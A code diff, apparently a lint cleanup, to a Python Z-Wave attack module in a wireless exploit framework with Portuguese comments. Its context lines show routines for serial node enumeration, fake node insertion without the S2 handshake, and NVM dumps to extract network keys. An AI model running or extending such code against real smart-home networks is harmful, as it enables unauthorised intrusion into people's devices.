@@ -16,7 +16,6 @@ import shutil
 import subprocess
 import time
 from pathlib import Path
-from typing import Optional
 
 from wirelessxpl.core.exploit.exploit import Exploit, Protocol
 from wirelessxpl.core.exploit.option import OptBool, OptInteger, OptString
@@ -168,7 +167,7 @@ class ZWaveAttackSuite(Exploit):
         """Enumeração de nós na rede Z-Wave via pyzwave."""
         print(f"[*] Escaneando rede Z-Wave em {self.ZWAVE_PORT.value} ...")
         try:
-            import serial  # noqa: PLC0415
+            import serial
             port = self.ZWAVE_PORT.value
             with serial.Serial(port, 115200, timeout=2) as ser:
                 # Envia frame de solicitação de informações de nó (INS_NODE_INFO)
@@ -193,7 +192,7 @@ class ZWaveAttackSuite(Exploit):
         print("[*] CVE-2024-50920 — Fake Node Insertion")
         print("    Envia frames de inclusão não autenticada para inserir nó falso.")
         try:
-            import serial  # noqa: PLC0415
+            import serial
             port = self.ZWAVE_PORT.value
             with serial.Serial(port, 115200, timeout=2) as ser:
                 # ADD_NODE_TO_NETWORK sem S2 handshake (explora ausência de validação)
@@ -256,7 +255,7 @@ class ZWaveAttackSuite(Exploit):
         print("[*] Tentando extração de network key Z-Wave ...")
         print("    Método 1: dump NVM do controlador via porta serial")
         try:
-            import serial  # noqa: PLC0415
+            import serial
             port = self.ZWAVE_PORT.value
             with serial.Serial(port, 115200, timeout=2) as ser:
                 # NVM Read Ext — solicita leitura de NVM (requer firmware vulnerável)
